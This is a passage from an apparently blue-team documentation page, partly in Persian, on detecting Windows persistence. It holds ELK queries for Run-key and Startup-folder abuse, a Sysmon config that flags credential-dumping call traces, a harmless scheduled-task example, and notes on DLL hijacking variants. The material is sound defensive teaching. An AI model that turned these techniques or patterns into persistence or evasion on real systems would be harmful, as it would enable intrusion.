21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>ELk Detetction </p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">registry where </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> registry.path : (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &quot;*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &quot;*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     &quot;*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     &quot;*\\SOFTWARE\\Microsoft\\Command Processor\\Autorun\\*&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  )</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">registry where </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> registry.data.strings != null and process.name : &quot;WmiPrvSe.exe&quot; and</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> registry.path : (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKEY_USERS\\*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKEY_USERS\\*\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\*&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="schedule">Schedule<a href="#schedule" class="hash-link" aria-label="لینک مستقیم به Schedule" title="لینک مستقیم به Schedule">​</a></h4><ul><li><p>At.exe</p></li><li><p>Schtasks.exe</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTASKS /CREATE /SC WEEKLY /D SUN /TN &quot;MyTasks\Notepad task&quot; /TR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &quot;C:\Windows\System32\notepad.exe&quot; /ST 11:00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="-2"><a href="#-2" class="hash-link" aria-label="لینک مستقیم به -2" title="لینک مستقیم به -2">​</a></h4><h4 class="anchor anchorWithStickyNavbar_LWe7" id="dll-persistent-attack">DLL Persistent Attack<a href="#dll-persistent-attack" class="hash-link" aria-label="لینک مستقیم به DLL Persistent Attack" title="لینک مستقیم به DLL Persistent Attack">​</a></h4><ul><li><p>DLL Search order Hijacking</p><ul><li><p>Hijacking the search order  takes place by putting the evil DLL in a location that is searched in  before the actual DLL</p><div dir="rtl" align="right">قبل از اینکه فایل های DLL از محل اصلی اجرا شوند از فولدری که نفوذ گر میخواهد خوانده شود</div></li></ul></li><li><p>Phantom DLL Hijacking </p><ul><li>  drop an evil DLL in place  of a missing/non-existing DLL that a legitimate application tries to  load</li></ul></li></ul><div dir="rtl" align="right">برنامه ای مجاز را مجبور به بار گذاری فایل های dll مخرب میکند</div><ul><li><p>DLL Side-Loading</p><ul><li>replace the legitimate DLL  with the evil DLL in the relevant WinSxS folder of the targeted DLL</li></ul></li></ul><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(winlog.event_id:&quot;4657&quot; AND winlog.event_data.ProcessName:&quot;C\:\\Windows\\System32\\services.exe&quot; AND &quot;cmd.exe\ \/c&quot; AND &quot;MACHINE\\SYSTEM&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-xquery codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xquery codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file where event.type != &quot;deletion&quot; and user.domain != &quot;NT AUTHORITY&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">and </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(file.path : &quot;C:\\*\\Programs\\Startup\\*.lnk&quot; and process.name :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(&quot;wscript.exe&quot;, &quot;cscript.exe&quot;)) or </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> file.path :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(&quot;C:\\*\\Programs\\Startup\\*.vbs&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;C:\\*\\Programs\\Startup\\*.vbe&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;C:\\*\\Programs\\Startup\\*.wsh&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;C:\\*\\Programs\\Startup\\*.wsf&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;C:\\*\\Programs\\Startup\\*.js&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>sysmon </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">Sysmon </span><span class="token assign-left variable" style="color:#36acaa">schemaversion</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;4.40&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">HashAlgorithms</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">*</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/HashAlgorithms</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">EventFiltering</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">RuleGroup </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">groupRelation</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;or&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">ProcessAccess </span><span class="token assign-left variable" style="color:#36acaa">onmatch</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;include&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=ProviderExecMethod&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">framedynos.dll+2b49</span><span class="token operator file-descriptor important" style="color:#393A34">6</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=CWbemProviderGlueExecMethodAsync&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">framedynos.dll+2cb3e</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains any&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=WSHellExec&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">wshom.ocx+c8a0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">wshom.ocx+c39d</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=CSShellExecute_ExecuteAssoc&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SHELL32.dll+9b5bd</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=CSShellExecute_DoExecute&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SHELL32.dll+ae3b</span><span class="token operator file-descriptor important" style="color:#393A34">9</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">Rule </span><span class="token assign-left variable" style="color:#36acaa">groupRelation</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;and&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=CreateProcessW&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">SourceImage </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Program Files</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft Office</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Root</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Office1</span><span class="token operator file-descriptor important" style="color:#393A34">6</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/SourceImage</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">KERNELBASE.dll+7651</span><span class="token operator file-descriptor important" style="color:#393A34">6</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/Rule</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=MiniDumpWriteDump&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">dbgcore.DLL+6cfb</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">CallTrace </span><span class="token assign-left variable" style="color:#36acaa">condition</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;contains&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;function_name=PssCaptureSnapShot&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">KernelBase.dll+de67e</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/CallTrace</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/ProcessAccess</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/RuleGroup</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/EventFiltering</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/Sysmon</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/BT/12- Detecting Persistent.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>ویرایش مطالب این صفحه</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs Pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/t1/docs/BT/Detecting Evasion"><div class="pagination-nav__sublabel">قبلی</div><div class="pagination-nav__label">Detecting Evasion</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/t1/docs/BT/Lateral Movement"><div class="pagination-nav__sublabel">بعدی</div><div class="pagination-nav__label">Lateral Movement</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#addmonitor" class="table-of-contents__link toc-highlight">AddMonitor</a><ul><li><a href="#detection" class="table-of-contents__link toc-highlight">Detection</a></li></ul></li><li><a href="#hunting-application-shimming" class="table-of-contents__link toc-highlight">Hunting Application Shimming</a><ul><li><a href="#detection-1" class="table-of-contents__link toc-highlight">Detection</a></li></ul></li><li><a href="#service-controlmanager" class="table-of-contents__link toc-highlight">Service Control Manager</a><ul><li><a href="#detection-2" class="table-of-contents__link toc-highlight">Detection</a></li></ul></li><li><a href="#event-log-onlinehelp" class="table-of-contents__link toc-highlight">Event Log Online Help</a><ul><li><a href="#detection-3" class="table-of-contents__link toc-highlight">Detection</a></li></ul></li><li><a href="#wmi-persistent" class="table-of-contents__link toc-highlight">WMI Persistent</a><ul><li><a href="#auditing-wmi---powershell" class="table-of-contents__link toc-highlight">Auditing WMI - Powershell</a></li></ul></li><li><a href="#auditing-wmi-sysmon" class="table-of-contents__link toc-highlight">Auditing WMI Sysmon</a><ul><li><a href="#other-wmi-artifacts" class="table-of-contents__link toc-highlight">Other WMI Artifacts</a></li><li><a href="#auditing-wmi-with-elk" class="table-of-contents__link toc-highlight">Auditing WMI with ELK</a></li><li><a href="#remove-wmi" class="table-of-contents__link toc-highlight">Remove WMI</a></li></ul></li><li><a href="#persistent-via-timeprovider" class="table-of-contents__link toc-highlight">Persistent Via TimeProvider</a></li><li><a href="#malware-persistent" class="table-of-contents__link toc-highlight">Malware Persistent</a><ul><li><a href="#detction" class="table-of-contents__link toc-highlight">Detction</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">تایماز 2023</div></div></div></footer></div>
<script src="/t1/assets/js/runtime~main.6cba7662.js"></script>
<script src="/t1/assets/js/main.6dd431d2.js"></script>
</body>
</html>